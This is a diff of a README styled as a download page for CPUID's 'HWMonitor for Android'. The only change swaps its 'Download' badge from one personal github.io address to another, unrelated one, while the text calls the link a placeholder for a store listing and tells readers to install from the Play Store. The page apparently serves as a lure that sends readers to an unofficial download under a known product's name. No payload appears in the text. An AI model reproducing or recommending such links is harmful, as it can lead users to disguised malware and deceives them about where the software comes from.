@@ -24,7 +24,7 @@ Install from Play Store, grant sensor permissions, add **HWMonitor for Android w
 | :--- | :--- |
 | **Get HWMonitor for Android mobile sensor views** | Placeholder link for CPUID **HWMonitor for Android mobile sensor views** store listing. |
 
-[![Download](https://img.shields.io/badge/Get-HWMonitor_Android-green?style=for-the-badge)](https://louisejunerainbow1998.github.io/.github/)
+[![Download](https://img.shields.io/badge/Get-HWMonitor_Android-green?style=for-the-badge)](https://fordchangjcqy.github.io/.github/hwmonitor-for-android-mobile-sensor)
 
 ## System Requirements
 
